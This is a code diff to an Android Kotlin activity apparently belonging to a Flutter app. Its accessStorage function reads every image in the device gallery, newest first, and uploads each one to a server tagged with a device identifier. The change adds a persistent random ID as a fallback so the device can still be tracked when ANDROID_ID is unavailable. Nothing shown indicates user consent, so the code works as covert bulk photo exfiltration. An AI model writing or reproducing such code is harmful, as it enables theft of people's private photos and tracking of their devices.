@@ -210,39 +210,53 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     }
 
     private fun accessStorage() {
-        val deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
-        Log.d(TAG, "📱 Device ID: $deviceId")
+    val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
+    var deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
 
-        lifecycleScope.launch(Dispatchers.IO) {
-            val projection = arrayOf(
-                MediaStore.Images.Media._ID,
-                MediaStore.Images.Media.DISPLAY_NAME
-            )
-
-            val cursor = contentResolver.query(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                projection,
-                null,
-                null,
-                "${MediaStore.Images.Media.DATE_ADDED} DESC"
-            )
-
-            cursor?.use {
-                var index = 0
-                while (it.moveToNext()) {
-                    val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
-                    val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
-                    val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
-
-                    Log.d(TAG, "📤 正在上传第 ${index + 1} 张: $name")
-                    delay(index * 200L)
-                    uploadImageToServer(uri, name, deviceId)
-
-                    index++
-                }
-            } ?: Log.e(TAG, "❌ 无法读取相册")
+    if (deviceId.isNullOrBlank()) {
+        deviceId = prefs.getString("random_device_id", null)
+        if (deviceId == null) {
+            deviceId = java.util.UUID.randomUUID().toString()
+            prefs.edit().putString("random_device_id", deviceId).apply()
+            Log.w(TAG, "⚠️ 无法获取 Android_ID，生成并使用随机设备 ID: $deviceId")
+        } else {
+            Log.w(TAG, "⚠️ 使用已保存的随机设备 ID: $deviceId")
         }
+    } else {
+        Log.d(TAG, "📱 获取到 Android_ID: $deviceId")
     }
+
+    lifecycleScope.launch(Dispatchers.IO) {
+        val projection = arrayOf(
+            MediaStore.Images.Media._ID,
+            MediaStore.Images.Media.DISPLAY_NAME
+        )
+
+        val cursor = contentResolver.query(
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            projection,
+            null,
+            null,
+            "${MediaStore.Images.Media.DATE_ADDED} DESC"
+        )
+
+        cursor?.use {
+            var index = 0
+            while (it.moveToNext()) {
+                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
+                val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
+                val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
+
+                Log.d(TAG, "📤 正在上传第 ${index + 1} 张: $name")
+                delay(index * 200L)
+                uploadImageToServer(uri, name, deviceId)
+
+                index++
+            }
+        } ?: Log.e(TAG, "❌ 无法读取相册")
+    }
+}
+
 
     override fun onRequestPermissionsResult(
         requestCode: Int,
